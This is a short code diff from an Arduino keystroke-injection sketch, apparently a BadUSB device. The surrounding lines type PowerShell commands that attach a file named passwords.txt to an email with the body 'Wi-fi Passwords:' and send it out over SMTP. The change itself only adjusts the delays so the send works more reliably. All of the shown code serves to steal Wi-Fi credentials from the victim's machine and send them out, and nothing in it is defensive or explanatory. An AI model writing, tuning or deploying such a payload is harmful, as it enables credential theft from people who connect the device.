@@ -160,8 +160,9 @@ void loop() {
     Keyboard.println("$ReportEmail.Body = 'Wi-fi Passwords:'");
     delay(100)
     Keyboard.println("$ReportEmail.Attachments.Add('passwords.txt')");
-    delay(1000);
+    delay(100);
     Keyboard.println("$SMTPInfo.Send($ReportEmail)");
+    delay(2000);
     // exit cmd
     Keyboard.println("exit");
     delay(5000);
